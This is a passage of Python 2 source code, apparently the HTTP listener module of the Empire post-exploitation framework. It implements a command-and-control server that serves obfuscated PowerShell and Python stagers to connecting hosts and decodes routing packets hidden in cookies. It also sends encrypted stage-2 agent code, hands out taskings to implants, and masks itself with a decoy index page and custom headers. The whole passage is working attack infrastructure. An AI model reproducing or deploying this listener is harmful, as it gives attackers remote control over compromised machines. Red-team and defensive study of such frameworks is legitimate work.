                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                return launcher
            elif 'py' in stager:
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                return launcher
            else:
                return make_response(self.default_response(), 404)

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                listenerName = self.options['Name']['Value']
                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(request.remote_addr)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                return make_response(self.default_response(), 404)


        @app.after_request
        def change_header(response):
            "Modify the headers response server."
            headers = listenerOptions['Headers']['Value']
            for key in headers.split("|"):
               value = key.split(":")
               response.headers[value[0]] = value[1]
            return response


        @app.after_request
        def add_proxy_headers(response):
            "Add HTTP headers to avoid proxy caching."
            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
            response.headers['Pragma'] = "no-cache"
            response.headers['Expires'] = "0"
            return response

        @app.route('/')
        @app.route('/index.html')
        def serve_index():
            """
            Return default server web page if user navigates to index.
            """

            static_dir = self.mainMenu.installPath + "data/misc/"
            return make_response(self.index_page(), 200)

        @app.route('/welcome.png')
        def serve_index_helper():
            """
            Serves image loaded by index page.
            """

            static_dir = self.mainMenu.installPath + "data/misc/"
            return send_from_directory(static_dir, 'welcome.png')


        @app.route('/<path:request_uri>', methods=['GET'])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """
            clientIP = request.remote_addr

            listenerName = self.options['Name']['Value']
            message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

            routingPacket = None
            cookie = request.headers.get('Cookie')

            if cookie and cookie != '':
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if self.session_cookie in cookie:
                        listenerName = self.options['Name']['Value']
                        message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
                        signal = json.dumps({
                            'print': False,
                            'message': message
                        })
                        dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                        cookieParts = cookie.split(';')
                        for part in cookieParts:
                            if part.startswith(self.session_cookie):
                                base64RoutingPacket = part[part.find('=')+1:]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception as e:
                    routingPacket = None
                    pass

            if routingPacket:
                # parse the routing packet and process the results
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == 'STAGE0':
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                listenerName = self.options['Name']['Value']
                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
                                signal = json.dumps({
                                    'print': True,
                                    'message': message
                                })
                                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                return make_response(stage, 200)

                            elif results.startswith('ERROR:'):
                                listenerName = self.options['Name']['Value']
                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
                                signal = json.dumps({
                                    'print': True,
                                    'message': message
                                })
                                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

                                if 'not in cache' in results:
                                    # signal the client to restage
                                    print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP))
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                listenerName = self.options['Name']['Value']
                                message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                signal = json.dumps({
                                    'print': False,
                                    'message': message
                                })
                                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                                return make_response(results, 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http')
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                listenerName = self.options['Name']['Value']
                message = "[!] {} requested by {} with no routing packet.".format(request_uri, clientIP)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                return make_response(self.default_response(), 200)

        @app.route('/<path:request_uri>', methods=['POST'])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions['StagingKey']['Value']
            clientIP = request.remote_addr

            requestData = request.get_data()

            listenerName = self.options['Name']['Value']
            message = "[*] POST request data length from {} : {}".format(clientIP, len(requestData))
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if results:
                        if results.startswith('STAGE2'):
                            # TODO: document the exact results structure returned
                            if ':' in clientIP:
                                clientIP = '[' + str(clientIP) + ']'
                            sessionID = results.split(' ')[1].strip()
                            sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']

                            listenerName = self.options['Name']['Value']
                            message = "[*] Sending agent (stage 2) to {} at {}".format(sessionID, clientIP)
                            signal = json.dumps({
                                'print': True,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

                            hopListenerName = request.headers.get('Hop-Name')
                            try:
                                hopListener = helpers.get_listener_options(hopListenerName)
                                tempListenerOptions = copy.deepcopy(listenerOptions)
                                tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                            except TypeError:
                                tempListenerOptions = listenerOptions

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                            encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                            # TODO: wrap ^ in a routing packet?

                            return make_response(encryptedAgent, 200)

                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                            listenerName = self.options['Name']['Value']
                            message = "[!] Error returned for results by {} : {}".format(clientIP, results)
                            signal = json.dumps({
                                'print': True,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                            return make_response(self.default_response(), 404)
                        elif results == 'VALID':
                            listenerName = self.options['Name']['Value']
                            message = "[*] Valid results returned by {}".format(clientIP)
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                            return make_response(self.default_response(), 404)
                        else:
                            return make_response(results, 200)
                    else:
                        return make_response(self.default_response(), 404)
            else:
                return make_response(self.default_response(), 404)

        try:
            certPath = listenerOptions['CertPath']['Value']
            host = listenerOptions['Host']['Value']
            if certPath.strip() != '' and host.startswith('https'):
                certPath = os.path.abspath(certPath)
                pyversion = sys.version_info

                # support any version of tls
                pyversion = sys.version_info
                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                    proto = ssl.PROTOCOL_TLS
                elif pyversion[0] >= 3:
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                context.set_ciphers("ECDHE-RSA-AES128-GCM-SHA256")
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            listenerName = self.options['Name']['Value']
            message = "[!] Listener startup on port {} failed: {}".format(port, e)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()


    def generate_cookie(self):
        """
        Generate Cookie
        """

        chars = string.letters
        cookie = helpers.random_string(random.randint(6,16), charset=chars)

        return cookie
